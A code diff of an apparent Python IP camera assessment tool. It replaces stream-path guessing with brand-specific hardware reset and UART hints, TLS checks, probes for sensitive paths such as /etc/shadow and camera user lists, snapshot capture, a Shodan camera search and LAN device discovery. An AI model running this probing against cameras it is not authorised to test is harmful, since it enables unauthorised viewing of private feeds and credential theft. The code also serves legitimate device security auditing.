-            if any(x in url.lower() for x in ['rtsp://', 'rtmp://', 'mms://']):
-                return True
-        
-        # Method 2: Try GET request for better detection
-        response = requests.get(url, timeout=TIMEOUT, verify=False, stream=True)
-        if response.status_code == 200:
-            # Check content type
-            content_type = response.headers.get('Content-Type', '').lower()
-            if any(x in content_type for x in ['video', 'stream', 'mpeg', 'h264', 'mjpeg', 'rtsp', 'rtmp', 'image']):
-                return True
-            
-            # Check for video file extensions in URL
-            if any(x in url.lower() for x in ['.mp4', '.m3u8', '.ts', '.flv', '.webm', '.avi', '.mov']):
-                return True
-            
-            # Check for streaming protocols in URL
-            if any(x in url.lower() for x in ['rtsp://', 'rtmp://', 'mms://', 'rtp://']):
-                return True
-            
-            # Check response content for stream indicators
-            try:
-                content = response.text.lower()
-                if any(x in content for x in ['stream', 'video', 'live', 'camera', 'mjpg', 'mpeg']):
-                    return True
-            except (UnicodeDecodeError, AttributeError):
-                pass
-        
-        # Method 3: Check for specific camera stream patterns
-        if any(x in url.lower() for x in ['/video', '/stream', '/live', '/mjpg', '/snapshot']):
-            return True
-            
-    except requests.exceptions.RequestException:
-        pass
-    except Exception as e:
-        pass
-    return False
-
-def detect_camera_brand(ip, open_ports):
-    """Detect camera brand from HTTP responses"""
-    detected_brands = set()
-    
-    # Brand indicators in URLs, content, or headers
-    brand_indicators = {
-        'axis': ['/view/index.shtml', '/axis-cgi/', 'axis', 'axis communications'],
-        'hikvision': ['hikvision', '/ISAPI/', '/Streaming/'],
-        'dahua': ['dahua', '/cgi-bin/magicBox.cgi'],
-        'sony': ['sony', 'ipela'],
-        'panasonic': ['panasonic', 'network camera'],
-    }
-    
-    for port in open_ports[:5]:  # Check first 5 ports
-        try:
-            protocol = get_protocol(port)
-            url = f"{protocol}://{ip}:{port}/"
-            response = requests.get(url, headers=HEADERS, timeout=2, verify=False)
-            
-            if response.status_code == 200:
-                content = response.text.lower()
-                url_lower = url.lower()
-                
-                # Check for brand indicators
-                for brand, indicators in brand_indicators.items():
-                    if any(ind in content or ind in url_lower for ind in indicators):
-                        detected_brands.add(brand)
-        except (requests.exceptions.RequestException, Exception):
-            continue
-    
-    return detected_brands
-
-def detect_live_streams(ip, open_ports, rtsp_ports=None):
-    """Enhanced live stream detection with better methods"""
-    print(f"\n{C}[🎥] Checking for Live Streams:{W}")
-    found_streams = False
-    
-    if rtsp_ports is None:
-        rtsp_ports = []
-    
-    # Detect camera brands that might support RTSP
-    detected_brands = detect_camera_brand(ip, open_ports)
-    
-    # Common streaming protocols and their default ports
-    streaming_ports = {
-        'rtsp': [554, 8554, 10554],  # Multiple RTSP ports
-        'rtmp': [1935, 1936],
-        'http': [80, 8080, 8000, 8001],
-        'https': [443, 8443, 8444],
-        'mms': [1755],
-        'onvif': [3702, 80, 443],  # ONVIF discovery and streaming
-        'vlc': [8080, 8090]  # VLC streaming ports
-    }
-    
-    # FIRST: Show RTSP links for RTSP ports (detected + standard RTSP ports that are open)
-    # Combine detected RTSP ports with standard RTSP ports that are open
-    all_rtsp_ports = set(rtsp_ports) | set([p for p in open_ports if p in streaming_ports['rtsp']])
-    
-    # ALSO: For known camera brands that support RTSP, suggest RTSP URLs even if not detected
-    # Brands that commonly support RTSP: Axis, Hikvision, Dahua, Sony, Panasonic
-    rtsp_supporting_brands = {'axis', 'hikvision', 'dahua', 'sony', 'panasonic'}
-    if detected_brands & rtsp_supporting_brands and not all_rtsp_ports:
-        # Camera brand detected but no RTSP ports found - suggest RTSP on common ports
-        suggested_rtsp_ports = [554]  # Standard RTSP port
-        # Also suggest RTSP on HTTP ports if it's a known brand
-        for port in open_ports:
-            if port in [80, 443, 8000, 8080] and port not in all_rtsp_ports:
-                suggested_rtsp_ports.append(port)
-        
-        all_rtsp_ports = all_rtsp_ports | set(suggested_rtsp_ports)
-        if suggested_rtsp_ports:
-            brand_names = ', '.join([b.capitalize() for b in detected_brands & rtsp_supporting_brands])
-            print(f"\n{C}[🎯] {brand_names} Camera Detected - Suggesting RTSP URLs (RTSP may be available):{W}")
-    
-    if all_rtsp_ports:
-        found_streams = True  # Mark streams as found if RTSP ports detected
-        # Only show "RTSP Ports Found" header if not already shown for brand detection
-        if not (detected_brands & rtsp_supporting_brands and not rtsp_ports):
-            print(f"\n{C}[🎯] RTSP Ports Found - Potential RTSP URLs:{W}")
-        rtsp_ports_sorted = sorted(all_rtsp_ports)
-        for port in rtsp_ports_sorted:
-            # Show common RTSP paths
-            common_paths = ['/', '/live.sdp', '/h264.sdp', '/stream1', '/Streaming/Channels/1']
-            # Brand-specific paths
-            if 'axis' in detected_brands:
-                common_paths.extend(['/axis-media/media.amp', '/axis-media/media.amp?camera=1'])
-            if 'hikvision' in detected_brands:
-                common_paths.extend(['/Streaming/Channels/101', '/Streaming/Channels/1'])
-            
-            for path in common_paths[:5]:  # Limit to 5 paths per port
-                rtsp_url = f"rtsp://{ip}:{port}{path}"
-                print(f"  🎥 RTSP: {rtsp_url}")
-            print(f"     🎯 Use VLC (Media -> Open Network Stream) to test these RTSP URLs")
-        print()  # Empty line for readability
-    
-    # Enhanced stream paths for different camera brands
-    stream_paths = {
-        'rtsp': [
-            # Generic paths
-            '/live.sdp',
-            '/h264.sdp',
-            '/stream1',
-            '/stream2',
-            '/main',
-            '/sub',
-            '/video',
-            '/cam/realmonitor',
-            '/Streaming/Channels/1',
-            '/Streaming/Channels/101',
-            # Brand-specific paths
-            '/onvif/streaming/channels/1',  # ONVIF
-            '/axis-media/media.amp',  # Axis
-            '/axis-cgi/mjpg/video.cgi',  # Axis
-            '/cgi-bin/mjpg/video.cgi',  # Generic
-            '/cgi-bin/hi3510/snap.cgi',  # Hikvision
-            '/cgi-bin/snapshot.cgi',  # Generic
-            '/cgi-bin/viewer/video.jpg',  # Generic
-            '/img/snapshot.cgi',  # Generic
-            '/snapshot.jpg',  # Generic
-            '/video/mjpg.cgi',  # Generic
-            '/video.cgi',  # Generic
-            '/videostream.cgi',  # Generic
-            '/mjpg/video.mjpg',  # Generic
-            '/mjpg.cgi',  # Generic
-            '/stream.cgi',  # Generic
-            '/live.cgi',  # Generic
-            '/live/0/onvif.sdp',  # ONVIF
-            '/live/0/h264.sdp',  # Generic
-            '/live/0/mpeg4.sdp',  # Generic
-            '/live/0/audio.sdp',  # Generic
-            '/live/1/onvif.sdp',  # ONVIF
-            '/live/1/h264.sdp',  # Generic
-            '/live/1/mpeg4.sdp',  # Generic
-            '/live/1/audio.sdp'  # Generic
+    brand_hints = {
+        "Hikvision": [
+            "Check the bottom panel for a small door; often hides the SD slot and a RESET button.",
+            "HOLD RESET while powering on (30s) to force factory defaults on most models.",
+            "UART Pins: VCC, RX, TX, GND (often 3.3v TTL) located near the SoC.",
+            "Exposed Ethernet pigtail: Check for PoE grounding issues or physical tapping."
         ],
-        'rtmp': [
-            '/live',
-            '/stream',
-            '/hls',
-            '/flv',
-            '/rtmp',
-            '/live/stream',
-            '/live/stream1',
-            '/live/stream2',
-            '/live/main',
-            '/live/sub',
-            '/live/video',
-            '/live/audio',
-            '/live/av',
-            '/live/rtmp',
-            '/live/rtmps'
+        "Dahua": [
+            "External RESET button is frequently found on the camera pigtail or near the lens.",
+            "Holding RESET during boot (10-15s) often clears the admin password.",
+            "UART: Standard 4-pin header (GND, TX, RX, 3.3V) usually clearly silk-screened.",
+            "Some NVRs/Cameras have a front-facing USB port that may accept auto-run firmware."
         ],
-        'http': [
-            # Generic paths
-            '/video',
-            '/stream',
-            '/mjpg/video.mjpg',
-            '/cgi-bin/mjpg/video.cgi',
-            '/axis-cgi/mjpg/video.cgi',
-            '/cgi-bin/viewer/video.jpg',
-            '/snapshot.jpg',
-            '/img/snapshot.cgi',
-            # Brand-specific paths
-            '/onvif/device_service',  # ONVIF
-            '/onvif/streaming',  # ONVIF
-            '/axis-cgi/com/ptz.cgi',  # Axis
-            '/axis-cgi/param.cgi',  # Axis
-            '/cgi-bin/snapshot.cgi',  # Generic
-            '/cgi-bin/hi3510/snap.cgi',  # Hikvision
-            '/cgi-bin/viewer/video.jpg',  # Generic
-            '/img/snapshot.cgi',  # Generic
-            '/snapshot.jpg',  # Generic
-            '/video/mjpg.cgi',  # Generic
-            '/video.cgi',  # Generic
-            '/videostream.cgi',  # Generic
-            '/mjpg/video.mjpg',  # Generic
-            '/mjpg.cgi',  # Generic
-            '/stream.cgi',  # Generic
-            '/live.cgi',  # Generic
-            # Additional paths
-            '/api/video',  # API endpoints
-            '/api/stream',
-            '/api/live',
-            '/api/video/live',
-            '/api/stream/live',
-            '/api/camera/live',
-            '/api/camera/stream',
-            '/api/camera/video',
-            '/api/camera/snapshot',
-            '/api/camera/image',
-            '/api/camera/feed',
-            '/api/camera/feed/live',
-            '/api/camera/feed/stream',
-            '/api/camera/feed/video',
-            # CP Plus specific paths
-            '/cgi-bin/snapshot.cgi',
-            '/cgi-bin/video.cgi',
-            '/cgi-bin/stream.cgi',
-            '/cgi-bin/live.cgi'
+        "Axis": [
+            "Check for the 'Control Button' near the SD card slot. Used for factory reset and service modes.",
+            "Firmware can often be re-uploaded via the USB port on high-end dome models.",
+            "Internal microSD cards may contain unencrypted video caches if not hardened."
+        ],
+        "Reolink": [
+            "RESET button is almost always exposed on the cable harness. Extremely vulnerable.",
+            "SD card slot is protected by a rubber grommet; ensure it hasn't been tampered with.",
+            "Proprietary power connectors may leak data if serial-over-power is enabled."
+        ],
+        "Generic": [
+            "Exposed pigtail cables allow for easy network tapping or hardware reset.",
+            "Standard UART/Serial headers are universal for low-cost Chinese chipsets (XM, GrainMedia).",
+            "Hardware Backdoors: Look for unpopulated 'J1' or 'J2' headers on the mainboard."
         ]
     }
-    
-    def check_stream_with_details(url):
-        """Check stream and provide detailed information"""
-        try:
-            response = requests.get(url, timeout=TIMEOUT, verify=False, stream=True)
-            if response.status_code == 200:
-                content_type = response.headers.get('Content-Type', '').lower()
-                content_length = response.headers.get('Content-Length', '0')
-                
-                # Check if it's actually a stream/video
-                is_rtsp_rtmp_mms = any(x in url.lower() for x in ['rtsp://', 'rtmp://', 'mms://', 'rtp://'])
-                is_http_https = url.lower().startswith('http://') or url.lower().startswith('https://')
-                
-                # Check content type for video/stream indicators (including multipart streams)
-                is_stream_content = any(x in content_type for x in ['video', 'stream', 'mpeg', 'h264', 'mjpeg', 'image', 'multipart'])
-                
-                if is_stream_content:
-                    print(f"  ✅ Stream Found: {url}")
-                    print(f"     📺 Content-Type: {content_type}")
-                    print(f"     📏 Content-Length: {content_length}")
-                    # Only suggest VLC for RTSP/RTMP/MMS streams
-                    if is_rtsp_rtmp_mms:
-                        print(f"     🎯 RTSP/RTMP Stream - Use VLC (Media -> Open Network Stream): {url}")
-                    elif is_http_https:
-                        print(f"     🌐 HTTP/HTTPS Stream - Open in browser: {url}")
-                    return True
-                elif any(x in url.lower() for x in ['.mp4', '.m3u8', '.ts', '.flv', '.webm', '.avi', '.mov']):
-                    print(f"  ✅ Video File: {url}")
-                    print(f"     📺 Content-Type: {content_type}")
-                    if is_rtsp_rtmp_mms:
-                        print(f"     🎯 RTSP/RTMP Stream - Use VLC (Media -> Open Network Stream): {url}")
-                    elif is_http_https:
-                        print(f"     🌐 HTTP/HTTPS Video - Open in browser: {url}")
-                    return True
-                elif is_rtsp_rtmp_mms:
-                    print(f"  ✅ Streaming URL: {url}")
-                    print(f"     🎯 RTSP/RTMP Stream - Use VLC (Media -> Open Network Stream): {url}")
-                    return True
-                elif any(x in url.lower() for x in ['/video', '/stream', '/live', '/mjpg', '/snapshot']):
-                    print(f"  ✅ Potential Stream: {url}")
-                    print(f"     📺 Content-Type: {content_type}")
-                    if is_http_https:
-                        print(f"     🌐 HTTP/HTTPS Stream - Open in browser: {url}")
-                    return True
-        except (requests.exceptions.RequestException, Exception):
-            pass
-        return False
-    
-    # Check all ports for streams with threading
-    threads = []
-    max_concurrent = 30
-    
-    # Check RTSP streams on ALL detected RTSP ports (including non-standard ports)
-    rtsp_ports_to_check = set(rtsp_ports) | set(streaming_ports['rtsp'])  # Combine detected RTSP ports with standard ones
-    
-    for port in open_ports:
-        # Check RTSP streams on ALL RTSP-detected ports (not just standard port 554)
-        if port in rtsp_ports_to_check:
-            for path in stream_paths['rtsp']:
-                url = f"rtsp://{ip}:{port}{path}"
-                thread = threading.Thread(target=lambda u=url: check_stream_with_details(u) or None)
-                thread.daemon = True
-                threads.append(thread)
-                thread.start()
-                found_streams = True
-                
-                if len(threads) >= max_concurrent:
-                    for t in threads:
-                        t.join()
-                    threads = []
-        
-        # Check RTMP streams
-        if port in streaming_ports['rtmp']:
-            for path in stream_paths['rtmp']:
-                url = f"rtmp://{ip}:{port}{path}"
-                thread = threading.Thread(target=lambda u=url: check_stream_with_details(u) or None)
-                thread.daemon = True
-                threads.append(thread)
-                thread.start()
-                found_streams = True
-                
-                if len(threads) >= max_concurrent:
-                    for t in threads:
-                        t.join()
-                    threads = []
-        
-        # Check HTTP/HTTPS streams
-        if port in streaming_ports['http'] + streaming_ports['https']:
-            protocol = 'https' if port in streaming_ports['https'] else 'http'
-            for path in stream_paths['http']:
-                url = f"{protocol}://{ip}:{port}{path}"
-                thread = threading.Thread(target=lambda u=url: check_stream_with_details(u) or None)
-                thread.daemon = True
-                threads.append(thread)
-                thread.start()
-                found_streams = True
-                
-                if len(threads) >= max_concurrent:
-                    for t in threads:
-                        t.join()
-                    threads = []
-        
-        # Check MMS streams
-        if port in streaming_ports['mms']:
-            url = f"mms://{ip}:{port}"
-            thread = threading.Thread(target=lambda u=url: check_stream_with_details(u) or None)
-            thread.daemon = True
-            threads.append(thread)
-            thread.start()
-            found_streams = True
-            
-            if len(threads) >= max_concurrent:
-                for t in threads:
-                    t.join()
-                threads = []
-        
-        # Check ONVIF streams
-        if port in streaming_ports['onvif']:
-            url = f"http://{ip}:{port}/onvif/device_service"
-            thread = threading.Thread(target=lambda u=url: check_stream_with_details(u) or None)
-            thread.daemon = True
-            threads.append(thread)
-            thread.start()
-            found_streams = True
-            
-            if len(threads) >= max_concurrent:
-                for t in threads:
-                    t.join()
-                threads = []
-    
-    # Wait for remaining threads with timeout
-    for thread in threads:
-        thread.join(timeout=10)  # Add timeout to prevent hanging
-    
-    # Small delay to ensure all output is flushed
-    time.sleep(0.5)
-    
-    if not found_streams:
-        print("  ❌ No live streams detected")
-    else:
-        print(f"  📊 Stream detection completed")
-        if all_rtsp_ports:
-            print(f"\n{C}[ℹ️] RTSP Streams Detected - To view RTSP/RTMP streams in VLC:{W}")
-            print("    1. Open VLC Media Player")
-            print("    2. Go to 'Media' -> 'Open Network Stream'")
-            print("    3. Paste the RTSP URL (e.g., rtsp://IP:PORT/) and click 'Play'")
-        
-        # Always show HTTP/HTTPS message if streams were found
-        print(f"\n{C}[ℹ️] HTTP/HTTPS streams can be opened directly in your web browser{W}")
-        print(f"     💡 Tip: Look above for HTTP/HTTPS stream URLs (e.g., http://IP:PORT/mjpg/video.mjpg)")
 
-def main(ip_input=None):
-    global threads_running
+    specific = brand_hints.get(brand, brand_hints["Generic"])
+    full_assessment = "\n       ".join(base_hints + specific)
+    return full_assessment
+
+def analyze_tls(ip, port):
+    """Analyzes the TLS/SSL configuration of a given port."""
+    print(f"    [{SHLD}] TLS/SSL Analysis for Port {port}:")
     try:
-        if ip_input is None:
-            user_input = input(f"{G}[+] {C}Enter IP address (or IP:PORT): {W}").strip()
-        else:
-            user_input = ip_input
-        
-        # Parse IP:PORT format
-        target_ip, specified_port = parse_ip_port(user_input)
-        if target_ip is None:
+        context = ssl.create_default_context()
+        context.check_hostname = False
+        context.verify_mode = ssl.CERT_NONE
+
+        with socket.create_connection((ip, port), timeout=TIMEOUT) as sock:
+            with context.wrap_socket(sock, server_hostname=ip) as ssock:
+                cipher = ssock.cipher()
+                version = ssock.version()
+                cert = ssock.getpeercert(binary_form=True)
+
+                print(f"       {INFO} Protocol: {version}")
+                print(f"       {INFO} Cipher: {cipher[0]} ({cipher[2]} bits)")
+
+                if version in ["TLSv1", "TLSv1.1"]:
+                    print(f"       {ALRT} VULNERABILITY: Deprecated TLS version ({version})")
+
+                if cert:
+                    x509 = ssl.DER_cert_to_PEM_cert(cert)
+                    # Simple expiry check would require more deps, but we can flag self-signed/generic
+                    if "OU=Root CA" in x509 or "CN=IPCamera" in x509:
+                        print(f"       {ALRT} WARNING: Likely Self-Signed or Generic Certificate")
+    except Exception as e:
+        print(f"       {ERR} TLS Analysis Failed: {str(e)}")
+
+def directory_enumeration(ip, port, proto, brand, auth=None):
+    """Targeted directory enumeration for sensitive paths."""
+    print(f"    [{RADR}] Running Targeted Directory Enumeration...")
+    sensitive_paths = [
+        "/php/get_system_info.php", "/system/device_info", "/proc/kmsg",
+        "/config/backup.bin", "/mnt/sdcard/", "/etc/shadow", "/etc/passwd",
+        "/cgi-bin/config.sh", "/cgi-bin/main.cgi?action=get_sys_info",
+        "/axis-cgi/admin/param.cgi?action=list", "/ISAPI/Security/users",
+        "/cgi-bin/magicBox.cgi?action=getSystemInfo"
+    ]
+
+    found = []
+    for path in sensitive_paths:
+        try:
+            url = f"{proto}://{ip}:{port}{path}"
+            r = make_request(url, auth=auth, timeout=2, verify=False)
+            if r.status_code == 200:
+                print(f"       {FIRE} EXPOSED: {url} (HTTP 200)")
+                found.append(path)
+            elif r.status_code == 401:
+                pass # Protected, good
+        except: pass
+    return found
+
+def analyze_http_port(ip, port):
+    print(f"\n  {SCAN} Analyzing Port {port} ({'HTTPS' if port in [443, 8443] else 'HTTP'}):")
+    try:
+        proto = "https" if port in [443, 8443] else "http"
+        url = f"{proto}://{ip}:{port}"
+        r = make_request(url, timeout=TIMEOUT, verify=False)
+
+        content_type = r.headers.get('Content-Type', 'unknown')
+        server = r.headers.get('Server', 'unknown')
+        status = r.status_code
+
+        print(f"    {OPEN} Content Type: {content_type}")
+        if status == 200:
+            print(f"    {OPEN} Endpoint Active: {url}/ (HTTP {status})")
+        print(f"    {INFO} Server: {server}")
+        print(f"    {INFO} Status: {status}")
+
+        # Extended Brand Detection in Body/Headers
+        c = r.text.lower()
+        s = server.lower()
+        brand = "Generic"
+        if "hikvision" in c or "hikvision" in s or "dvrip" in c: brand = "Hikvision"
+        elif "dahua" in c or "web service" in c or "dahua" in s: brand = "Dahua"
+        elif "axis" in c or "axis" in s: brand = "Axis"
+        elif "sony" in c or "sony" in s: brand = "Sony"
+        elif "bosch" in c or "bosch" in s: brand = "Bosch"
+        elif "samsung" in c or "samsung" in s or "hanwha" in c: brand = "Samsung/Hanwha"
+        elif "panasonic" in c: brand = "Panasonic"
+        elif "vivotek" in c: brand = "Vivotek"
+        elif "reolink" in c: brand = "Reolink"
+        elif "foscam" in c: brand = "Foscam"
+        elif "mobotix" in c: brand = "Mobotix"
+        elif "cp plus" in c or "cpplus" in c: brand = "CP Plus"
+        elif "camit" in c or "dvr" in c: brand = "Generic DVR"
+
+        if brand != "Generic":
+            print(f"    {SHLD} Brand Identified: {brand}")
+
+        if any(x in c for x in ["login", "user", "password", "auth"]):
+            print(f"    {OPEN} Login Form Detected")
+
+        return c, brand
+    except Exception as e:
+        print(f"    {ERR} Connection Error: {type(e).__name__}")
+        return "", "Generic"
+
+import re
+
+def parse_firmware_data(text, brand):
+    """Attempts to extract firmware and model info using regex."""
+    info = {"model": "Unknown", "firmware": "Unknown", "build": "Unknown"}
+
+    if brand == "Hikvision":
+        m = re.search(r"<model>(.*?)</model>", text, re.I)
+        f = re.search(r"<firmwareVersion>(.*?)</firmwareVersion>", text, re.I)
+        b = re.search(r"<firmwareReleasedDate>(.*?)</firmwareReleasedDate>", text, re.I)
+        if m: info["model"] = m.group(1)
+        if f: info["firmware"] = f.group(1)
+        if b: info["build"] = b.group(1)
+    elif brand == "Dahua":
+        m = re.search(r"DeviceType=(.*?)\r\n", text, re.I)
+        f = re.search(r"SoftwareVersion=(.*?)\r\n", text, re.I)
+        b = re.search(r"BuildDate=(.*?)\r\n", text, re.I)
+        if m: info["model"] = m.group(1)
+        if f: info["firmware"] = f.group(1)
+        if b: info["build"] = b.group(1)
+    elif brand == "Axis":
+        m = re.search(r"root.Brand.ProdFullName=(.*?)\n", text, re.I)
+        f = re.search(r"root.Properties.System.Firmware.Version=(.*?)\n", text, re.I)
+        if m: info["model"] = m.group(1)
+        if f: info["firmware"] = f.group(1)
+
+    # Generic extraction for common patterns
+    if info["model"] == "Unknown":
+        m = re.search(r"(?:model|device)[_ ]?(?:name|type)[\":= ]+([^\"<\n\r,]+)", text, re.I)
+        if m: info["model"] = m.group(1).strip()
+    if info["firmware"] == "Unknown":
+        f = re.search(r"(?:fw|firmware|version|soft)[_ ]?(?:ver|version)[\":= ]+([^\"<\n\r,]+)", text, re.I)
+        if f: info["firmware"] = f.group(1).strip()
+
+    return info
+
+def manual_snapshot_capture(target_ip, port, user=None, pwd=None):
+    """Specific function for UI-triggered snapshot capture."""
+    proto = "https" if port in [443, 8443] else "http"
+    auth = (user, pwd) if user else None
+
+    paths = [
+        "/snapshot.jpg",
+        "/cgi-bin/snapshot.cgi",
+        "/ISAPI/Streaming/channels/101/picture",
+        "/cgi-bin/viewer/video.jpg",
+        "/onvif-http/snapshot?Profile_1"
+    ]
+
+    for path in paths:
+        try:
+            url = f"{proto}://{target_ip}:{port}{path}"
+            r = requests.get(url, auth=auth, timeout=5, verify=False)
+            if r.status_code == 200 and 'image' in r.headers.get('Content-Type', ''):
+                # Return base64 for the UI to display
+                return base64.b64encode(r.content).decode('utf-8')
+        except: pass
+    return None
+
+def quick_test_url(url, timeout=5):
+    """Performs a quick HTTP GET test on a URL (curl-like)."""
+    try:
+        if url.startswith("rtsp"):
+            print(f"    📡 RTSP streams can't be tested with HTTP - try in VLC or Live View")
             return
-        
-        if not validate_ip(target_ip):
+        # Use stream=True to avoid hanging on infinite MJPEG streams
+        r = requests.get(url, timeout=timeout, verify=False, stream=True)
+
+        # We only read headers and maybe a tiny bit of content to get size if it exists
+        size_kb = 0
+        if 'Content-Length' in r.headers:
+            size_kb = int(r.headers['Content-Length']) // 1024
+        else:
+            # For streams, we don't want to call r.content as it will hang
+            size_kb = 0
+
+        print(f"    ✅ {url} → HTTP {r.status_code} | Size: {size_kb}KB (reported)")
+        return r.status_code
+    except Exception as e:
+        print(f"    ❌ {url} → Error: {type(e).__name__}")
+
+def shodan_search(api_key, query):
+    """Searches Shodan for cameras based on a query."""
+    if shodan is None:
+        print(f"  {ERR} Shodan library not available. Install it with 'pip install shodan'.")
+        return
+
+    print(f"\n[{GLOB}] Initiating Global Shodan Search: {query}")
+    try:
+        api = shodan.Shodan(api_key)
+        results = api.search(query)
+        print(f"  {OPEN} Total Results Found: {results['total']}")
+
+        for result in results['matches'][:10]: # Top 10 for terminal
+            ip = result['ip_str']
+            port = result['port']
+            org = result.get('org', 'Unknown Org')
+            print(f"  {RADR} {ip}:{port} ({org})")
+            if 'product' in result: print(f"     {INFO} Product: {result['product']}")
+            if 'location' in result:
+                loc = result['location']
+                print(f"     {GLOB} Location: {loc.get('city', 'Unknown')}, {loc.get('country_name', 'Unknown')}")
+    except Exception as e:
+        print(f"  {ERR} Shodan Search Error: {str(e)}")
+
+def discover_upnp_ssdp():
+    """SSDP/UPnP multicast discovery - finds smart TVs, printers, cameras, routers"""
+    import socket
+    import re
+
+    output = []
+    output.append("📡 SSDP/UPnP Discovery Started")
+    output.append("=" * 50)
+
+    ssdp_request = (
+        'M-SEARCH * HTTP/1.1\r\n'
+        'HOST: 239.255.255.250:1900\r\n'
+        'MAN: "ssdp:discover"\r\n'
+        'MX: 10\r\n'
+        'ST: ssdp:all\r\n'
+        '\r\n'
+    )
+
+    discovered = {}
+
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
+        sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)
+        sock.settimeout(5)
+        sock.sendto(ssdp_request.encode(), ('239.255.255.250', 1900))
+
+        while True:
+            try:
+                data, addr = sock.recvfrom(4096)
+                ip = addr[0]
+
+                if ip in discovered:
+                    continue  # skip duplicates
+
+                resp = data.decode(errors='ignore')
+                location = re.search(r"LOCATION:\s*(.*)\r\n", resp, re.I)
+                server   = re.search(r"SERVER:\s*(.*)\r\n",   resp, re.I)
+                st       = re.search(r"ST:\s*(.*)\r\n",       resp, re.I)
+
+                discovered[ip] = True
+
+                output.append(f"\n🔵 Device found: {ip}")
+                if server:
+                    output.append(f"   Server  : {server.group(1).strip()}")
+                if st:
+                    output.append(f"   Type    : {st.group(1).strip()}")
+                if location:
+                    loc_url = location.group(1).strip()
+                    output.append(f"   Location: {loc_url}")
+
+                    # Try to fetch the device description XML
+                    try:
+                        import urllib.request
+                        with urllib.request.urlopen(loc_url, timeout=2) as r:
+                            xml = r.read().decode(errors='ignore')
+
+                        # Pull friendly name, model, manufacturer from XML
+                        friendly = re.search(r"<friendlyName>(.*?)</friendlyName>", xml, re.I)
+                        model    = re.search(r"<modelName>(.*?)</modelName>",       xml, re.I)
+                        manuf    = re.search(r"<manufacturer>(.*?)</manufacturer>", xml, re.I)
+
+                        if friendly: output.append(f"   Name    : {friendly.group(1).strip()}")
+                        if model:    output.append(f"   Model   : {model.group(1).strip()}")
+                        if manuf:    output.append(f"   Maker   : {manuf.group(1).strip()}")
+
+                    except:
+                        output.append("   (Could not fetch device details)")
+
+            except socket.timeout:
+                break  # no more responses
+
+        sock.close()
+
+    except Exception as e:
+        return f"❌ SSDP Error: {str(e)}"
+
+    if len(discovered) == 0:
+        output.append("\n⚠️ No UPnP devices found.")
+        output.append("This is normal if your router has UPnP disabled.")
+    else:
+        output.append(f"\n✅ Total UPnP devices found: {len(discovered)}")
+
+    return "\n".join(output)
+
+def get_mac_vendor(target_ip):
+    """Attempts MAC lookup via ARP and identifies Vendor."""
+    mac = "Unknown"
+    vendor = "Unknown Vendor"
+    try:
+        if not IS_ANDROID and os.path.exists("/proc/net/arp"):
+            # Try to read ARP table
+            with open("/proc/net/arp", "r") as f:
+                for line in f:
+                    if target_ip in line:
+                        parts = line.split()
+                        if len(parts) >= 4:
+                            mac = parts[3]
+                            break
+    except:
+        return "Unknown", "Unknown (Android restriction)"
+
+    try:
+        if mac != "Unknown" and mac != "00:00:00:00:00:00":
+            # Simple offline vendor check for top camera brands
+            prefix = mac.replace(":", "").upper()[:6]
+            vendors = {
+                "00408C": "Axis Communications", "00E04F": "Axis Communications", "ACCC8E": "Axis Communications",
+                "001DFA": "Hikvision", "BCAD28": "Hikvision", "4419B6": "Hikvision", "CC6B1E": "Hikvision", "B4A382": "Hikvision",
+                "000B5D": "Dahua Technology", "38AF29": "Dahua Technology", "6C1F6E": "Dahua Technology", "9002A9": "Dahua Technology",
+                "00075F": "Panasonic", "0080F0": "Panasonic", "88108F": "Panasonic",
+                "00032F": "Sony", "000ED9": "Sony", "28C13C": "Sony",
+                "000747": "Bosch Security Systems", "000AF5": "Bosch Security Systems",
+                "0002D1": "Vivotek", "0018AE": "Vivotek",
+                "B0C554": "Reolink", "E0B94D": "Reolink",
+                "00606E": "Foscam (Shenzhen Foscan)", "B4B362": "Foscam",
+                "000325": "Mobotix",
+                "000C29": "VMware (Virtual Target)", "080027": "VirtualBox (Virtual Target)"
+            }
+            vendor = vendors.get(prefix, "Searching online...")
+
+            # Online fallback for more accuracy
+            if vendor == "Searching online...":
+                try:
+                    r = requests.get(f"https://api.macvendors.com/{mac}", timeout=2)
+                    if r.status_code == 200:
+                        vendor = r.text
+                except:
+                    vendor = "Unknown (API Timeout)"
+
+        return mac, vendor
+    except:
+        return "Unknown", "MAC Restricted"
+
+def identify_device(ip):
+    """Fallback identification when MAC is restricted (Android 10+)."""
+    # Expanded ports for better identification
+    cam_ports = {
+        554: "RTSP (IP Camera)",
+        3702: "ONVIF (IP Camera)",
+        8000: "Hikvision",
+        37777: "Dahua",
+        34567: "XMEye / Generic CCTV",
+        80: "HTTP",
+        443: "HTTPS",
+        8080: "HTTP-Alt",
+        81: "HTTP-Alt",
+        82: "HTTP-Alt",
+        88: "HTTP-Alt",
+        5000: "Synology / UPnP",
+        8443: "HTTPS-Alt",
+        9000: "Sony / Bosch",
+        37778: "Dahua Config",
+        21: "FTP (Storage)",
+        23: "Telnet (Console)"
+    }
+
+    found_ports = []
+    brand = "Unknown Device"
+    is_camera = False
+
+    # Fast port check
+    for port, label in cam_ports.items():
+        try:
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.settimeout(0.1) # Very fast check for LAN
+                if s.connect_ex((ip, port)) == 0:
+                    found_ports.append(port)
+                    if port in [554, 3702, 8000, 37777, 34567, 37778]:
+                        is_camera = True
+                        if port == 8000: brand = "Hikvision"
+                        elif port in [37777, 37778]: brand = "Dahua"
+                        elif port == 34567: brand = "XMEye Camera"
+                        elif port == 554 and brand == "Unknown Device": brand = "IP Camera"
+        except: pass
+
+    # Try HTTP banner if web port is open for deeper identification
+    web_ports = [p for p in found_ports if p in [80, 443, 8080, 81, 82, 88, 5000, 8443, 9000]]
+    if web_ports:
+        for p in web_ports:
+            try:
+                proto = "https" if p in [443, 8443] else "http"
+                r = requests.get(f"{proto}://{ip}:{p}", timeout=0.5, verify=False, allow_redirects=True)
+                server = r.headers.get("Server", "").lower()
+                text = r.text.lower()
+
+                # Check headers and body for common brands
+                if any(x in server or x in text for x in ["hikvision", "hik-", "dvrip"]):
+                    brand = "Hikvision"; is_camera = True; break
+                elif any(x in server or x in text for x in ["dahua", "web service", "dvr-", "nvr-"]):
+                    brand = "Dahua"; is_camera = True; break
+                elif "axis" in server or "axis" in text:
+                    brand = "Axis Camera"; is_camera = True; break
+                elif "bosch" in server:
+                    brand = "Bosch Camera"; is_camera = True; break
+                elif "sony" in server:
